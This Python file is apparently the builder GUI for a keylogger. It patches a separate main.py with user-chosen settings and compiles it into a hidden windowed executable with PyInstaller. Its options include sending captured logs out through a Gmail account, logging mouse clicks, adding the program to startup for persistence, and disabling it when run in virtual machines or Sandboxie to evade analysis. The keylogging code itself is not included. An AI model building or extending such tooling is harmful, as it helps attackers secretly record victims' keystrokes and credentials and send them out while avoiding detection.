from tkinter import *
import os, shutil, sys
from tkinter import messagebox

python_path = "\"" + os.path.dirname(sys.executable)

if not os.path.isfile("main.py"):
    print("main.py not found!")
    sys.exit(0)


def save_file(constructor, gmail_args):
    new_line = f"if __name__ == \"__main__\": main = main{constructor};"
    if gmail_args != "": new_line += f"main.override_gmail{gmail_args};"
    new_line += "main.start()"

    i = 0
    file = open("main.py", "r")
    file_contents = file.readlines()
    file.close()

    # use loop in order to ensure that line number doesnt matter
    for i in range(0, len(file_contents)):
        if file_contents[i][0:len("if __name__ == \"__main__\":")] == "if __name__ == \"__main__\":":
            break

    file_contents = file_contents[:i]
    file_contents.append(new_line)

    file = open("main.py", "w")
    file.writelines(file_contents)
    file.close()


def build():
    # https://github.com/pyinstaller/pyinstaller/issues/3005
    try:
        shutil.rmtree(os.environ["APPDATA"] + "/pyinstaller")
    except: pass

    os.system(python_path + "/Scripts/pyinstaller\" main.py --onefile --windowed")


class setup:
    def __init__(self, ):
        self.config_bool = [False, False, False, False]
        self.use_gmail = False

    def create_ui(self, title, x, y):
        self.root = Tk()
        self.root.geometry(f"{x}x{y}")
        self.root.resizable(0, 0)
        self.root.title(title)

        self.txt_time = Entry(self.root, bd=3)
        Label(self.root, text="Export logs interval (s)").pack()
        self.txt_time.insert(END, "60")
        self.txt_time.pack()

        self.txt_export = Entry(self.root, bd=3)
        Label(self.root, text="Path to log export").pack()
        self.txt_export.insert(END, "%userprofile%\\log.txt")
        self.txt_export.pack()

        self.lb_frame = LabelFrame(self.root, text="Gmail export")
        self.lb_frame.pack()

        self.txt_username = Entry(self.lb_frame, bd=3)
        Label(self.lb_frame, text="Gmail username").pack()
        self.txt_username.insert(END, "email@gmail.com")
        self.txt_username.pack()

        self.txt_pass = Entry(self.lb_frame, bd=3)
        Label(self.lb_frame, text="Gmail password").pack()
        self.txt_pass.insert(END, "password")
        self.txt_pass.pack()

        self.lb_frame2 = LabelFrame(self.root, text="Optional config")
        self.lb_frame2.pack()

        self.btn_use_gmail = Button(self.lb_frame2, text="Use Gmail export", width=16, bd=4, command=self.on_click_use_gmail)
        self.btn_use_gmail.pack()

        self.btn_log_click = Button(self.lb_frame2, text="Log clicks", width=16, bd=4, command=self.on_click_log_click)
        self.btn_log_click.pack()

        self.btn_add_to_startup = Button(self.lb_frame2, text="Add to startup", width=16, bd=4, command=self.on_click_add_to_startup)
        self.btn_add_to_startup.pack()

        self.btn_check_vm = Button(self.lb_frame2, text="Disable for VMs", width=16, bd=4, command=self.on_click_check_vm)
        self.btn_check_vm.pack()

        self.btn_check_sandboxie = Button(self.lb_frame2, text="Disable for sandboxie", width=16, bd=4, command=self.on_click_check_sandboxie)
        self.btn_check_sandboxie.pack()

        self.btn_build = Button(self.root, text="Build", width=28, bd=4, command=self. on_click_build)
        self.btn_build.pack(side=BOTTOM)

        self.root.mainloop()

    def on_click_use_gmail(self):
        self.btn_use_gmail.configure(state="disabled")
        self.use_gmail = True

    def on_click_log_click(self):
        self.btn_log_click.configure(state="disabled")
        self.config_bool[1] = True

    def on_click_add_to_startup(self):
        self.btn_add_to_startup.configure(state="disabled")
        self.config_bool[0] = True

    def on_click_check_vm(self):
        self.btn_check_vm.configure(state="disabled")
        self.config_bool[2] = True

    def on_click_check_sandboxie(self):
        self.btn_check_sandboxie.configure(state="disabled")
        self.config_bool[3] = True

    def on_click_build(self):
        gmail_args = ""

        self.btn_build.configure(state="disabled")
        self.btn_use_gmail.configure(state="disabled")
        self.btn_log_click.configure(state="disabled")
        self.btn_add_to_startup.configure(state="disabled")
        self.btn_check_vm.configure(state="disabled")
        self.btn_check_sandboxie.configure(state="disabled")

        constructor_args = f"({self.txt_time.get()}, \"{self.txt_export.get()}\", {self.config_bool[0]}, " \
                           f"{self.config_bool[1]}, {self.config_bool[2]}, {self.config_bool[3]})"

        if self.use_gmail: gmail_args = f"(\"{self.txt_username.get()}\", \"{self.txt_pass.get()}\")"

        self.root.withdraw()

        save_file(constructor_args, gmail_args)
        build()

        messagebox.showinfo("Build", "Finished!")

        self.root.destroy()


if __name__ == "__main__":
    setup = setup()
    setup.create_ui("Setup", 200, 400)
